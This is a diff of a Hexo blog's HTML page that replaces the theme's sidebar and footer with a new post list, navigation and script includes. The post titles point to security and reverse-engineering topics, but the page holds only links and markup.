href="/tags/%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7/" rel="tag">编程技巧</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC/" rel="tag">脚本</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="tag">读书笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/" rel="tag">逆向学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>
+        <a class="" href="/2022/03/13/Rebuil-Hexo-Test/">Rebuil Hexo Test</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2022-02-23T08:26:55.000Z" itemprop="datePublished">2022-02-23</time>
+        
+      
     </div>
-  </div>
 
 
-  
+        <span>
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/error-solve/" style="font-size: 10px;">error&solve</a> <a href="/tags/frida/" style="font-size: 13.33px;">frida</a> <a href="/tags/tips/" style="font-size: 10px;">tips</a> <a href="/tags/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" style="font-size: 10px;">技术文章</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 20px;">渗透测试</a> <a href="/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/" style="font-size: 10px;">科学上网</a> <a href="/tags/%E7%BC%96%E7%A8%8B%E6%8A%80%E5%B7%A7/" style="font-size: 10px;">编程技巧</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 13.33px;">脚本</a> <a href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" style="font-size: 13.33px;">读书笔记</a> <a href="/tags/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">逆向学习</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 16.67px;">随笔</a>
+        <a class="" href="/2022/02/23/Make-Arsenal-from-Wanli/">Make Arsenal from Wanli</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2022-02-16T02:38:53.000Z" itemprop="datePublished">2022-02-16</time>
+        
+      
     </div>
-  </div>
 
-  
+
+        <span>
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li></ul>
+        <a class="" href="/2022/02/16/Wechat-small-program-Unpack/">Wechat small program Unpack</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2022-02-14T02:48:29.000Z" itemprop="datePublished">2022-02-14</time>
+        
+      
     </div>
-  </div>
+
+
+        <span>
+    
+        <a class="" href="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/">Learn yaklang from Redis Unauthorize</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2022-01-17T06:04:20.000Z" itemprop="datePublished">2022-01-17</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/">无需登陆出示验证码</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2021-12-31T01:53:51.000Z" itemprop="datePublished">2021-12-31</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2021/12/31/2021%E5%B9%B4%E6%80%9D%E6%83%B3%E8%AE%B0%E5%BD%95/">2021年思想记录</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2021-12-20T08:16:46.000Z" itemprop="datePublished">2021-12-20</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2021/12/20/%E7%A5%9E%E6%9C%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/">神机漏洞利用框架学习</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2021-12-17T02:23:14.000Z" itemprop="datePublished">2021-12-17</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2021/12/17/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%8A%80%E6%9C%AF%E8%83%BD%E5%8A%9B%E6%80%BB%E7%BB%93/">阶段性技术能力总结</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2021-12-09T09:52:11.000Z" itemprop="datePublished">2021-12-09</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2021/12/09/2021%E5%B9%B4%E6%97%B6%E9%97%B4%E7%BA%BF%E8%AE%B0%E5%BD%95/">2021年时间线记录</a>
+    
+
+
+</span>
+      </li>
+    
+      <li class="post-item">
+        
+    <div class="meta">
+      
+        
+          <time datetime="2021-12-09T06:11:34.000Z" itemprop="datePublished">2021-12-09</time>
+        
+      
+    </div>
+
+
+        <span>
+    
+        <a class="" href="/2021/12/09/%E5%A4%A7%E7%A7%A6%E5%B8%9D%E5%9B%BD%E5%A7%8B%E7%9A%87%E5%B8%9D%E7%89%87%E6%AE%B5/">大秦帝国始皇帝片段</a>
+    
+
+
+</span>
+      </li>
+    
+  </ul>
+  
+    
+    <div class="pagination">
+        
+        <span class="page-number">Pagina 1 de 4</span>
+        
+            <a href="/page/2/"><i class="fas fa-angle-right"></i>
+            </a>
+        
+    </div>
 
 
   
+</section>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
+    
+    2020-2022
+    givemefivw
+  </div>
+  <div class="footer-right">
+    <nav>
       <ul>
-        
-          <li>
-            <a href="/2022/02/23/Make-Arsenal-from-Wanli/">Make Arsenal from Wanli</a>
-          </li>
-        
-          <li>
-            <a href="/2022/02/16/Wechat-small-program-Unpack/">Wechat small program Unpack</a>
-          </li>
-        
-          <li>
-            <a href="/2022/02/14/Learn-yaklang-from-Redis-Unauthorize/">Learn yaklang from Redis Unauthorize</a>
-          </li>
-        
-          <li>
-            <a href="/2022/01/17/%E6%97%A0%E9%9C%80%E7%99%BB%E9%99%86%E5%87%BA%E7%A4%BA%E9%AA%8C%E8%AF%81%E7%A0%81/">无需登陆出示验证码</a>
-          </li>
-        
-          <li>
-            <a href="/2021/12/31/2021%E5%B9%B4%E6%80%9D%E6%83%B3%E8%AE%B0%E5%BD%95/">2021年思想记录</a>
-          </li>
-        
+        <!--
+       --><li><a href="/">Inicio</a></li><!--
+     --><!--
+       --><li><a href="/about/">Acerca de</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articulos</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">Proyectos</a></li><!--
+     -->
       </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2022 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
+    </nav>
   </div>
 </footer>
+
     </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <!-- styles -->
 
 
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
 
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
 
 
 
 
-<script src="/js/script.js"></script>
+<!-- clipboard -->
 
 
+<script src="/js/main.js"></script>
 
+<!-- search -->
 
-  </div>
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
 </body>
 </html>
